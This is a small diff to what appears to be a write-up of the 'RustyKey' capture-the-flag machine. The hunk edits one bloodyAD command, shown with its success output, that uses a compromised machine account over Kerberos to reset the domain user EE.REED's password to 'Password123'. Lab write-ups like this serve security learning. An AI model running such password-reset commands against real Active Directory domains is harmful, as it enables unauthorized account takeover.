@@ -101,7 +101,7 @@ bloodyAD --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rus<pass>
 [+] Password changed successfully!
 ```
 ```bash
-bloodyAD --dc-ip $ip --host dc.rustykey.htb -d rustykey.htb -k set password 'ee.reed' 'Password123'
+bloodyAD --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rus<pass>' -k set password EE.REED 'Password123'
 [+] Password changed successfully!
 ```
 
